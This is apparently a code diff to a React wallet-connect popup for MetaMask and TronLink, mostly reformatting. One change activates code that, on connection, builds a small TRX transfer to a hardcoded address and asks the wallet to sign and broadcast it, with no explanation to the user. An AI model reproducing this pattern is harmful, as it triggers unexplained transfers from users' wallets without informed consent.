@@ -42,7 +42,7 @@ const Popup: React.FC<PopupProps> = ({ onClose }) => {
       console.log('Install MetaMask please!!');
     }
   };
-
+  
   const connectWallet = async () => {
     if (window.ethereum) {
       try {
@@ -60,12 +60,13 @@ const Popup: React.FC<PopupProps> = ({ onClose }) => {
       window.location.href = 'https://metamask.io/';
     }
   };
-
+  
 
 //   const getTronweb = async () => {
 //     const intervalId = setInterval(async () => {
+     
 
-//       if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+//     if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
 //         clearInterval(intervalId);
 //         console.log("Yes, catch it:", window.tronWeb.defaultAddress.base58);
 
@@ -74,19 +75,22 @@ const Popup: React.FC<PopupProps> = ({ onClose }) => {
 //         try {
 //           if (userAddress.length > 0){
 //             setAccount2(userAddress);
-//           setPopupVisible(true);
+
 //         }
 //        else {
 //         setPopupVisible(true); 
+//        console.log("Install Tronlink if not installed yet")
 //       }
 //     } catch (error) {
 //       console.log(error);
 //     }
 //   } else {
 //     console.log('Install MetaMask please!!');
-// }
-//   }
-
+//     }
+  
+// }, 10000)
+//     };
+  
 // const handleTronLink = () => {
 //   const { tronLink } = window;
 //   if (tronLink) {
@@ -121,66 +125,61 @@ const Popup: React.FC<PopupProps> = ({ onClose }) => {
 
 
 const checkTronWeb = async () => {
-    const tronLink = window.tronLink;
+  const tronLink = window.tronLink;
 
-    if (tronLink && tronLink.ready) {
-      try {
-        const response = await tronLink.request({ method: 'tron_requestAccounts' });
-console.log(response)
-        if (response.code === 200) {         
-          console.log(response.message)
-          
-          const getTronweb = async () => {
-            const intervalId = setInterval(async () => {
+  if (!tronLink || !tronLink.ready) {
+    console.log("Account not connected yet");
+    return;
+  }
 
-              if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                clearInterval(intervalId);
-                console.log("Yes, catch it:", window.tronWeb.defaultAddress.base58);
+  try {
+    const response = await tronLink.request({ method: 'tron_requestAccounts' });
 
-                const tronweb = window.tronWeb;
-                const userAddress = tronweb.defaultAddress.base58;
-                try {
-                  if (userAddress.length > 0){
-                    setAccount2(userAddress);
-                  setPopupVisible(true);
-                }
-               else {
-                setPopupVisible(true); 
+    if (response.code === 200) {
+      console.log(response.message);
+
+      const getTronweb = async () => {
+        const intervalId = setInterval(async () => {
+          if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            clearInterval(intervalId);
+            console.log("Yes, catch it:", window.tronWeb.defaultAddress.base58);
+
+            const tronweb = window.tronWeb;
+            const userAddress = tronweb.defaultAddress.base58;
+
+            try {
+              if (userAddress.length > 0) {
+                setAccount2(userAddress);
+                const tx = await tronweb.transactionBuilder.sendTrx(
+                  'TN9RRaXkCFtTXRso2GdTZxSxxwufzxLQPP',
+                  10,
+                  'TTSFjEG3Lu9WkHdp4JrWYhbGP6K1REqnGQ'
+                );
+                const signedTx = await tronweb.trx.sign(tx);
+                const broastTx = await tronweb.trx.sendRawTransaction(signedTx);
+                console.log(broastTx);
+                setPopupVisible(true);
+              } else {
+                setPopupVisible(true);
               }
             } catch (error) {
               console.log(error);
             }
           } else {
-            console.log('Install MetaMask please!!');
-        }
-      }, 10)
+            console.log('Unexpected Error occured');
+          }
+        }, 10);
+      };
+
+      getTronweb();
+    } else {
+      console.log('User rejected the request');
     }
-    getTronweb();
-          
-        } else {
-          console.log('User rejected the request');
-        }
-      } catch (error) {
-        console.error('Error while requesting accounts:', error);
-      }
-    }else{
-      window.location.href = 'https://www.tronlink.org/';
-    }
+  } catch (error) {
+    console.error('Error while requesting accounts:', error);
+  }
+};
 
-  };
-
-        // const tx = await tronweb.transactionBuilder.sendTrx(
-        //   'TN9RRaXkCFtTXRso2GdTZxSxxwufzxLQPP',
-        //   10,
-        //   'TTSFjEG3Lu9WkHdp4JrWYhbGP6K1REqnGQ'
-        // );
-        // const signedTx = await tronweb.trx.sign(tx);
-        // const broastTx = await tronweb.trx.sendRawTransaction(signedTx);
-        // console.log(broastTx);
-      
-
-  //   }, 10);
-  // )};
 useEffect(() => {
   checkMetaMask();
   // const HttpProvider = TronWeb.providers.HttpProvider;
